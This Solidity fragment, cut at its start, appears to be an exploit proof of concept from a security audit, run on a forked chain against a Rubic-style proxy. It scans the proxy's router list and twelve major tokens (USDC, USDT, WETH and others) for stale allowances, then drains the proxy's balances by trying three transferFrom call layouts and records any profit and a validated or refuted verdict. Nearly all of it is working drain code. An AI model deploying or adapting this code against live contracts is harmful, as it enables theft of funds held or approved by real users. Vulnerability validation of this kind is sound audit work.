    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path = "no profitable drain path executed";
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address[] memory routers = IRubicProxyLike(TARGET).getAvailableRouters();
        address[12] memory tokens = _candidateTokens();

        uint256 previousImprovement;
        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            uint256 improvement;
            for (uint256 pass = 0; pass < rounds; pass++) {
                improvement += _probeAndDrain(routers, tokens);
            }
            if (rounds > 2 && improvement <= previousImprovement) {
                break;
            }
            previousImprovement = improvement;
        }

        if (_profitAmount > 0) {
            _validated = true;
            _verdict = "validated";
            return;
        }

        if (_staleApprovalObserved) {
            _path = "historical routerCall-created stale approvals observed, but no attacker-callable public gateway transferFrom path succeeded at fork";
            _verdict = "refuted";
        } else {
            _path = "no stale approval on scanned live tokens was found; exploit path precondition not established on scanned fork state";
            _verdict = "refuted";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function _probeAndDrain(address[] memory routers, address[12] memory tokens) internal returns (uint256 improvements) {
        bytes4 selectorPermit2Like = bytes4(keccak256("transferFrom(address,address,uint160,address)"));
        bytes4 selectorTokenFirst = bytes4(keccak256("transferFrom(address,address,address,uint256)"));
        bytes4 selectorTokenLast = bytes4(keccak256("transferFrom(address,address,uint256,address)"));

        for (uint256 tokenIndex = 0; tokenIndex < tokens.length; tokenIndex++) {
            address token = tokens[tokenIndex];
            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }

            for (uint256 routerIndex = 0; routerIndex < routers.length; routerIndex++) {
                address router = routers[routerIndex];
                uint256 allowance = _allowance(token, TARGET, router);
                if (allowance == 0) {
                    continue;
                }

                _staleApprovalObserved = true;

                if (router.code.length == 0) {
                    // The finding's final stage is mechanically real here only if the allowlisted EOA/spender is compromised.
                    // This PoC cannot manufacture off-chain key compromise, so EOAs are concrete non-executable preconditions.
                    continue;
                }

                uint256 beforeBalance = _balanceOf(token, address(this));
                uint256 amount = proxyBalance < allowance ? proxyBalance : allowance;
                if (amount == 0) {
                    continue;
                }

                if (amount > type(uint160).max) {
                    amount = type(uint160).max;
                }

                (bool ok, ) = router.call(
                    abi.encodeWithSelector(selectorPermit2Like, TARGET, address(this), uint160(amount), token)
                );
                uint256 afterBalance = _balanceOf(token, address(this));
                if (ok && afterBalance > beforeBalance) {
                    improvements++;
                    _recordProfit(token, afterBalance - beforeBalance, "historical stale approval -> public gateway transferFrom(from,to,uint160,token) drain");
                    continue;
                }

                beforeBalance = afterBalance;
                (ok, ) = router.call(
                    abi.encodeWithSelector(selectorTokenFirst, token, TARGET, address(this), amount)
                );
                afterBalance = _balanceOf(token, address(this));
                if (ok && afterBalance > beforeBalance) {
                    improvements++;
                    _recordProfit(token, afterBalance - beforeBalance, "historical stale approval -> public gateway transferFrom(token,from,to,amount) drain");
                    continue;
                }

                beforeBalance = afterBalance;
                (ok, ) = router.call(
                    abi.encodeWithSelector(selectorTokenLast, TARGET, address(this), amount, token)
                );
                afterBalance = _balanceOf(token, address(this));
                if (ok && afterBalance > beforeBalance) {
                    improvements++;
                    _recordProfit(token, afterBalance - beforeBalance, "historical stale approval -> public gateway transferFrom(from,to,amount,token) drain");
                }
            }
        }
    }

    function _recordProfit(address token, uint256 amount, string memory successfulPath) internal {
        if (_profitAmount == 0) {
            _profitToken = token;
            _profitAmount = amount;
            _path = successfulPath;
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
            _path = successfulPath;
        }
    }

    function _candidateTokens() internal pure returns (address[12] memory tokens) {
        tokens[0] = USDC;
        tokens[1] = USDT;
        tokens[2] = DAI;
        tokens[3] = WETH;
        tokens[4] = WBTC;
        tokens[5] = FRAX;
        tokens[6] = BUSD;
        tokens[7] = TUSD;
        tokens[8] = USDP;
        tokens[9] = MATIC;
        tokens[10] = LINK;
        tokens[11] = SHIB;
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

